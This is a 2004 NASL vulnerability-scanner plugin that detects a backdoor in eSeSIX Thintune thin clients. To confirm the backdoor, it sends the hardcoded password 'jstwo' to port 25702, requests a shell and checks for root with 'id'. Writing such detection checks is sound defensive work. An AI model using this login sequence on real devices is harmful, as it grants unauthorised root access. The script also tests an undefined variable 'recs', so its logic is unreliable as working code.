#
# Noam Rathaus
#
# From: "Loss, Dirk" <Dirk.Loss@it-consult.net>
# Subject: eSeSIX Thintune thin client multiple vulnerabilities
# Date: 24.7.2004 10:54

if(description)
{
 script_id(13839);
 script_cve_id("CAN-2004-2048", "CAN-2004-2049", "CAN-2004-2050", "CAN-2004-2051");
 script_bugtraq_id(10794);
 script_version("$Revision: 1.4 $");
 name["english"] = "eSeSIX Thintune Thin Client Multiple Vulnerabilities";
 
 script_name(english:name["english"]);
 
 desc["english"] = "
Thintune is a series of thin client appliances sold by eSeSIX GmbH, Germany.
They offer ICA, RDP, X11 and SSH support based on a customized Linux
platform.

Multiple security vulnerabilities have been found, one of them is a backdoor
password ('jstwo') allowing complete access to the system.

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Detect the presence of eSeSIX backdoor";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2004 Noam Rathaus");
 family["english"] = "Misc."; 

 script_family(english:family["english"]);
 script_dependencie("find_service2.nasl");
 script_require_ports("Services/unknown", 25702);
 exit(0);
}

port = 25702;
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  res = recv_line(socket:soc, length: 1024);
  if ("JSRAFV-1" >< recs)
  {
   req = "jstwo\n";
   send(socket:soc, data:req);

   res = recv_line(socket:soc, length:1024);
   if ("+yep" >< res)
   {
    req = "shell\n";
    send(socket:soc, data:req);

    res = recv_line(socket:soc, length:1024);
    if ("+yep here you are" >< res)
    {
     req = "id\n";
     send(socket:soc, data:req);

     res = recv(socket:soc, length:1024);
     if ("uid=0" >< res)
     {
      security_hole(port:port);
     }
    }
   }
  }
  close(soc);
 }
}

